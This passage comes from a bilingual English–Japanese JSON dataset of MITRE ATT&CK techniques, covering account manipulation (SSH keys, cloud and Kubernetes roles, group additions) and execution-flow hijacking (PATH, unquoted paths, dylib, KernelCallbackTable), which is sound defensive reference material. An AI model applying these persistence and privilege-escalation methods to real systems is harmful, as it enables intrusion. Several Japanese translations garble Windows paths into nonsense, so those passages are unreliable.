2024)",
                        "description_jp": "敵対者は、テナントへの永続的なアクセスを維持するために、敵対者が管理するクラウドアカウントに追加のロールや権限を追加する可能性がある。例えば、敵対者はクラウドベースの環境でIAMポリシーを更新したり、Office 365環境で新しいグローバル管理者を追加したりする可能性があります(引用: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) 十分な権限があれば、侵害されたアカウントはデータや設定にほぼ無制限にアクセスできるようになります(他の管理者のパスワードをリセットする機能を含む)(引用: Expel AWS Attacker)\n(引用：Microsoft O365管理者の役割)\n\nこのアカウント変更は、[Create Account](https://attack.mitre.org/techniques/T1136)または他の悪意のあるアカウント活動の直後に行われる可能性があります。攻撃者は、侵害した既存の[有効なアカウント](https://attack.mitre.org/techniques/T1078)を変更することもあります。これは、特に追加されたロールが追加のアカウントへの横方向の移動を許可している場合、特権の昇格につながる可能性があります。\n\n例えば、AWS 環境では、適切な権限を持つ敵は、<code>CreatePolicyVersion</code> API を使用して IAM ポリシーの新しいバージョンを定義したり、<code>AttachUserPolicy</code> API を使用して、侵害されたユーザーアカウントに追加または別の権限を持つ IAM ポリシーをアタッチすることができます。(引用: Rhino Security Labs AWS Privilege Escalation)\n\n場合によっては、敵対者は被害者のクラウドテナントの外部で敵対者が管理するアカウントにロールを追加することがあります。これにより、これらの外部アカウントは、敵対者が[Create Account](https://attack.mitre.org/techniques/T1136)または被害者が所有するアカウントを変更することなく、被害者テナント内でアクションを実行できるようになります(引用: Invictus IR DangerDev 2024)。"
                    },
                    {
                        "id": "T1098.005",
                        "name_eng": "Device Registration",
                        "name_jp": "機器登録",
                        "description_eng": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)\n\nSimilarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",
                        "description_jp": "敵は、敵が管理するアカウントにデバイスを登録することができる。デバイスは、ネットワークへの認証を処理する多要素認証（MFA）システム、またはデバイス・アクセスとコンプライアンスを処理するデバイス管理システムに登録されることがある。\n\nDuo や Okta などの MFA システムでは、MFA 要件を満たすために、ユーザが自分のアカウントにデバイスを関連付けることができる。ユーザの認証情報を侵害した敵対者は、最初の MFA 要件を回避してネットワークへの永続的なアクセスを獲得するために、新しいデバイスを登録する可能性があります（引用：CISA MFA PrintNightmare）。(引用：Mandiant APT29 Microsoft 365 2022)\n\n同様に、ネットワークへの既存のアクセス権を持つ敵対者は、条件付きアクセスポリシーをバイパスして機密データやリソースにアクセスするために、Entra ID および/またはそのデバイス管理システムである Microsoft Intune にデバイスを登録する可能性がある(引用: AADInternals - デバイス登録)(引用: AADInternals - 条件付きアクセスバイパス)(引用: Microsoft DEV-0537)\n\nEntra ID に登録されたデバイスは、メールクライアントによって不審なものとして扱われる可能性が低い、組織内の電子メールを介した [内部スピアフィッシング](https://attack.mitre.org/techniques/T1534) キャンペーンを実施できる可能性があります(引用: Microsoft - デバイス登録)。さらに、敵対者は、多数のデバイスを登録することによって、Entra ID テナントに対して [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) を実行できる可能性があります(引用: AADInternals - BPRT)。"
                    },
                    {
                        "id": "T1098.006",
                        "name_eng": "Additional Container Cluster Roles",
                        "name_jp": "追加のコンテナ・クラスタの役割",
                        "description_eng": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                        "description_jp": "敵対者は、コンテナオーケストレーションシステムへの永続的なアクセスを維持するために、敵対者が制御するユーザーまたはサービスアカウントに追加のロールまたはパーミッションを追加することができる。たとえば、十分なパーミッションを持つ敵対者は、RoleBindingまたはClusterRoleBindingを作成して、KubernetesアカウントにRoleまたはClusterRoleをバインドすることができる(引用: Kubernetes RBAC)(引用: Aquasec Kubernetes Attack 2023) 属性ベースのアクセス制御(ABAC)が使用されている場合、十分なパーミッションを持つ敵対者は、Kubernetes ABACポリシーを変更して、ターゲットアカウントに追加のパーミッションを与えることができる(引用: Kuberentes ABAC)\n \nこのアカウント修正は、[Create Account](https://attack.mitre.org/techniques/T1136)またはその他の悪意のあるアカウント活動の直後に行われる可能性があります。攻撃者は、侵害した既存の[Valid Accounts](https://attack.mitre.org/techniques/T1078)を修正することもあります。  \n\nGoogle Kubernetes Engine、Amazon Elastic Kubernetes Service、Azure Kubernetes Serviceのように、コンテナオーケストレーションシステムがクラウド環境にデプロイされている場合、クラウドベースのロールベースアクセス制御（RBAC）割り当てまたはABACポリシーが、ローカルの権限割り当ての代わりに、またはそれに加えて、しばしば使用できることに注意してください。(引用: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) これらの場合、このテクニックは[Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)と組み合わせて使用することができます。"
                    },
                    {
                        "id": "T1098.004",
                        "name_eng": "SSH Authorized Keys",
                        "name_jp": "SSH認証キー",
                        "description_eng": "Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code> (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure public key and RSA authentication are enabled, as well as modify the directive `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation: Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)",
                        "description_jp": "攻撃者は SSH <code>authorized_keys</code> ファイルを変更し、被害者ホスト上で永続性を維持する可能性があります。Linuxディストリビューション、macOS、およびESXiハイパーバイザーは、リモート管理のためのSSHセッションの認証プロセスを保護するために、一般的に鍵ベースの認証を使用します。SSHの<code>authorized_keys</code>ファイルは、そのファイルが設定されているユーザーアカウントへのログインに使用できるSSHキーを指定します。このファイルは通常、<code>&lt;user-home&gt;/.ssh/authorized_keys</code>（または、ESXi では `/etc/ssh/keys-<ユーザー名>/authorized_keys`）の下のユーザーのホームディレクトリにあります。(引用: SSH Authorized Keys) ユーザーはシステムの SSH 設定ファイルを編集して、ディレクティブ `PubkeyAuthentication` と `RSAAuthentication` を値 `yes` に変更し、公開鍵と RSA 認証が有効になっていることを確認します。また、ディレクティブ `PermitRootLogin` を値 `yes` に変更し、SSH による root 認証を有効にします。(Citation: Broadcom ESXi SSH) SSH 設定ファイルは通常 <code>/etc/ssh/sshd_config</code> の下にあります。\n\n敵はスクリプトやシェル・コマンドを使ってSSHの<code>authorized_keys</code>ファイルを直接修正し、敵が提供する公開鍵を追加することができる。クラウド環境では、敵はコマンドラインインターフェースやレストAPIを使って、特定の仮想マシンのSSH authorized_keysファイルを変更できるかもしれません。例えば、Google Cloud CLIの \"add-metadata \"コマンドを使用することで、敵対者はユーザーアカウントにSSH鍵を追加することができる（引用：Google Cloud Add Metadata）（引用：Google Cloud Privilege Escalation）同様に、Azureでは、敵対者はAPIへのPATCHリクエストによって仮想マシンのauthorized_keysファイルを更新することができる。(引用：Azure Update Virtual Machines) これにより、対応する秘密鍵を所有する敵対者は、SSH経由で既存のユーザーとしてログインすることができます。(引用：Venafi SSH Key Abuse) (引用：Cybereason Linux Exim Worm) また、仮想マシンまたはインスタンスが要求ユーザーとは異なる権限を持っている場合、権限の昇格につながる可能性があります。\n\nauthorized_keysファイルがクラウドAPIやコマンドラインインターフェースを介して変更される場合、敵対者は、より高い特権ユーザーにキーを追加すると、ターゲットの仮想マシン上で特権昇格を達成する可能性があります。\n\nSSH 鍵は、`ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)コマンドなどで、ネットワークデバイス上のアカウントに追加することもできる。(引用: cisco_ip_ssh_pubkey_ch_cmd)"
                    },
                    {
                        "id": "T1098.007",
                        "name_eng": "Additional Local or Domain Groups",
                        "name_jp": "ローカルまたはドメイングループの追加",
                        "description_eng": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.\n\nOn Windows, accounts may use the `net localgroup` and `net group` commands to add existing users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation: Microsoft Net Group) On Linux, adversaries may use the `usermod` command for the same purpose.(Citation: Linux Usermod)\n\nFor example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) to log into the endpoints in the future.(Citation: Microsoft RDP Logons) On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003) for elevated privileges. \n\nIn Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.(Citation: RootDSE AD Detection 2022)",
                        "description_jp": "敵対者は、システムやドメインへの永続的なアクセスを維持するために、敵対者が管理するアカウントにローカルグループやドメイングループを追加するかもしれない。\n\nWindowsでは、アカウントは`net localgroup`コマンドと`net group`コマンドを使って、既存のユーザーをローカルグループやドメイングループに追加することができる(引用: Microsoft Net Localgroup)(引用: Microsoft Net Group) Linuxでは、敵対者は同じ目的で`usermod`コマンドを使うことができる(引用: Linux Usermod)\n\n例えば、Windowsデバイスのローカル管理者グループにアカウントを追加して、昇格した特権を維持することができる。また、将来エンドポイントにログインするために[Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)を利用できるように、Remote Desktop Usersグループに追加することもできる。(引用: Microsoft RDP Logons) Linuxでは、昇格した特権のために[Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003)を持続的に利用できるように、sudoersグループにアカウントを追加することができる。\n\nWindows環境では、マシンアカウントをドメイングループに追加することもできる。これにより、ローカルのSYSTEMアカウントがドメイン上で特権を得ることができる(引用：RootDSE AD Detection 2022)。"
                    }
                ]
            },
            {
                "id": "T1574",
                "name_eng": "Hijack Execution Flow",
                "name_jp": "ハイジャック実行フロー",
                "description_eng": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
                "description_jp": "攻撃者は、オペレーティング・システムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性がある。実行フローの乗っ取りは、乗っ取られた実行が時間の経過とともに再発する可能性があるため、永続性を目的として行われることもあります。攻撃者はまた、アプリケーション制御やその他の実行制限などの特権の昇格や防御の回避のために、これらのメカニズムを使用する可能性があります。\n\n敵が実行の流れをハイジャックする方法には、オペレーティング・システムが実行するプログラムの場所を特定する方法を操作する方法など、さまざまなものがある。オペレーティング・システムがプログラムによって使われるライブラリを見つける方法も傍受される可能性があります。ファイル・ディレクトリや、Windowsの場合はレジストリなど、オペレーティング・システムがプログラム／リソースを探す場所も、悪意のあるペイロードを含むように不正に操作される可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1574.010",
                        "name_eng": "Services File Permissions Weakness",
                        "name_jp": "サービス・ファイル・パーミッションの脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                        "description_jp": "攻撃者は、サービスによって使用されるバイナリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性がある。攻撃者は、Windowsサービスのパーミッションの欠陥を利用して、サービス起動時に実行されるバイナリを置き換える可能性があります。これらのサービスプロセスは、その機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する可能性があります。ターゲット・バイナリを含むファイルシステム・ディレクトリのパーミッション、またはバイナリ自体のパーミッションが不適切に設定されている場合、ターゲット・バイナリはユーザーレベルのパーミッションを使用する別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高いパーミッション レベルの下で実行されている場合、置き換えられたバイナリも SYSTEM を含むより高いレベルのパーミッションの下で実行されます。\n\n攻撃者は、より高いパーミッションレベルでコードを実行する手段として、正当なバイナリを悪意のあるバイナリに置き換えるためにこのテクニックを使用する可能性があります。実行プロセスが特定の時間または特定のイベント(例えばシステムの起動)の間に実行されるように設定されている場合、このテクニックは永続化のためにも使用することができる。"
                    },
                    {
                        "id": "T1574.013",
                        "name_eng": "KernelCallbackTable",
                        "name_jp": "カーネルコールバックテーブル",
                        "description_eng": "Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
                        "description_jp": "攻撃者はプロセスの <code>KernelCallbackTable</code> を悪用して、独自のペイロードを実行するためにプロセスの実行フローをハイジャックする可能性があります。(引用: Lazarus APT January 2022)(引用: FinFisher exposed ) <code>KernelCallbackTable</code> はプロセス環境ブロック (PEB) にあり、<code>user32.dll</code> がロードされると、GUI プロセスで利用可能なグラフィック関数の配列に初期化されます。(引用: Windows プロセス インジェクション KernelCallbackTable)\n\n敵対者は、元のコールバック関数を悪意のあるペイロードで置き換えることで、<code>KernelCallbackTable</code>を使用したプロセスの実行フローを乗っ取る可能性があります。コールバック関数の変更は、別のプロセスへの [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) や [Process Injection](https://attack.mitre.org/techniques/T1055) など、関連する動作を含むさまざまな方法で行うことができます。\n\n<code>KernelCallbackTable</code>のメモリ アドレスへのポインタは、PEB の場所を特定することで取得できます (例: <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) 関数の呼び出しを介して)。(引用: NtQueryInformationProcess) ポインタが見つかったら、<code>KernelCallbackTable</code> を複製し、テーブル内の関数 (例:、<code>fnCOPYDATA</code>）を悪意のあるペイロードのアドレスに設定します（例：<code>WriteProcessMemory()</code>経由）。その後、PEBはテーブルの新しいアドレスで更新されます。改ざんされた関数が起動されると、悪意のあるペイロードがトリガーされます。(引用：Lazarus APT January 2022)\n\n改ざんされた関数は通常、Windowsメッセージを使って起動される。プロセスがハイジャックされ、悪意のあるコードが実行された後、<code>KernelCallbackTable</code> は悪意のあるペイロードの残りの部分によって元の状態に復元される可能性があります。 (引用: Lazarus APT January 2022) <code>KernelCallbackTable</code>を使用して実行フローをハイジャックすると、正当なプロセスの下で実行を隠蔽できるため、セキュリティ製品からの検出を回避できる可能性があります。"
                    },
                    {
                        "id": "T1574.007",
                        "name_eng": "Path Interception by PATH Environment Variable",
                        "name_jp": "PATH環境変数によるパスの遮断",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
                        "description_jp": "攻撃者は、ライブラリのロードに使用される環境変数をハイジャックすることで、独自の悪意あるペイロードを実行する可能性がある。PATH環境変数には、スクリプトやコマンドラインから呼び出されたバイナリを探すためにOSが順次検索するディレクトリ（UserとSystem）のリストが含まれている。\n\n攻撃者は、PATH環境変数に格納されたディレクトリのリストの前のエントリに悪意のあるプログラムを置くことができ、その結果、OSは、PATHリストを順次検索する際に、正当なバイナリではなく、悪意のあるバイナリを実行する。\n\n例えば、Windowsの場合、敵が「net.exe」という悪意のあるプログラムを「C:⊖example path」に置くと、デフォルトではPATH環境変数で「C:⊖Windowssystem32net.exe` 」の前に置かれるため、コマンドラインから「net」を実行すると、「C:⊖Windowssystem32net.exe` 」にあるシステムの正当な実行ファイルの代わりに「C:⊖example path` 」が呼び出されることになる。プログラムの実行方法の中には、[Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)からプログラムを実行するなど、プログラムのパスが与えられていない場合に検索される場所を決定するためにPATH環境変数に依存するものがある(引用: ExpressVPN PATH env Windows 2021)。\n\n敵対者は、検索対象のディレクトリを指定する $PATH 変数を直接変更することもできます。  敵対者は `$PATH` 変数を変更し、自分が書き込み権限を持つディレクトリを指すようにすることができる。PATH変数を使ったプログラムが呼び出されると、OSは指定されたディレクトリを検索し、悪意のあるバイナリを実行する。macOSでは、$HOME変数を変更することによっても実行できる。これらの変数は、コマンドライン、launchctl、[Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004)、または`/etc/paths.d`フォルダの内容を変更することで変更できる。(引用：uptycs Fake POC linux malware 2023)(引用：nixCraft macOS PATH変数)(引用：Elastic Rules macOS launchctl 2022)"
                    },
                    {
                        "id": "T1574.005",
                        "name_eng": "Executable Installer File Permissions Weakness",
                        "name_jp": "実行可能インストーラファイルのパーミッションの脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                        "description_jp": "攻撃者は、インストーラが使用するバイナリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。これらのプロセスは、その機能の一部として、あるいは他のアクションを実行するために、特定のバイナリを自動的に実行する可能性があります。ターゲットバイナリを含むファイルシステムディレクトリのパーミッションやバイナリ自体のパーミッションが不適切に設定されている場合、ターゲットバイナリはユーザレベルのパーミッションを使用する別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高いパーミッション レベルの下で実行されている場合、置き換えられたバイナリも SYSTEM を含むより高いレベルのパーミッションの下で実行されます。\n\nこのテクニックの別のバリエーションは、実行可能な自己解凍インストーラによくある弱点を利用することで実行可能です。インストールプロセス中、インストーラは、<code>%TEMP%</code> ディレクトリ内のサブディレクトリを使用して、DLL や EXE、その他のペイロードなどのバイナリを展開するのが一般的です。インストーラがサブディレクトリやファイルを作成する際、書き込みアクセスを制限する適切なパーミッションを設定しないことが多く、サブディレクトリに置かれた信頼できないコードの実行や、インストールプロセスで使用されたバイナリの上書きを許してしまいます。この挙動は、[DLL](https://attack.mitre.org/techniques/T1574/001) の検索順ハイジャックに関連しており、これを利用している可能性があります。\n\n攻撃者はこのテクニックを使って、より高いパーミッションレベルでコードを実行する手段として、正当なバイナリを悪意のあるバイナリに置き換える可能性があります。インストーラの中には、敵が制御するコードを実行する際に、特権の昇格を要求するものもあるかもしれません。この振る舞いは [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) に関連しています。(引用: mozilla_sec_adv_2012) (引用: Executable Installers are Vulnerable) 実行プロセスが特定の時間や特定のイベント(例えばシステムの起動)の間に実行されるように設定されている場合、このテクニックは永続化にも使用できます。"
                    },
                    {
                        "id": "T1574.009",
                        "name_eng": "Path Interception by Unquoted Path",
                        "name_jp": "引用されていないパスによるパスの妨害",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
                        "description_jp": "攻撃者は、脆弱なファイルパス参照をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性がある。敵は、パス内の上位ディレクトリに実行ファイルを配置することで、周囲の引用符がないパスを利用し、Windowsが敵の実行ファイルを選択して起動するようにすることができます。\n\nサービス パス (引用: Microsoft CurrentControlSet Services) およびショートカット パスも、パスに 1 つ以上のスペースがあり、引用符で囲まれていない場合 (たとえば、<code>C:unsafe path with spaceprogram.exe</code> vs. <code>\"C:unsafeパス with spaceprogram.exe\"</code>) 、パスを傍受される可能性があります。(引用：Help eliminate unquoted path）（Windows レジストリキーに格納）敵対者はパスの上位ディレクトリに実行可能ファイルを置くことができ、Windowsは意図した実行可能ファイルの代わりにその実行可能ファイルを解決する。たとえば、ショートカットのパスが<code>C:³³³.exe</code>の場合、敵は<code>C:³³³.exe</code>にプログラムを作成し、意図したプログラムの代わりに実行することができます。(引用: Windows Unquoted Services) (引用: Windows Privilege Escalation Guide)\n\nこのテクニックは、実行可能ファイルが定期的に呼び出される場合の永続化や、傍受された実行可能ファイルがより高い特権を持つプロセスによって起動される場合の特権昇格に使用できます。"
                    },
                    {
                        "id": "T1574.004",
                        "name_eng": "Dylib Hijacking",
                        "name_jp": "ディリブ・ハイジャック",
                        "description_eng": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
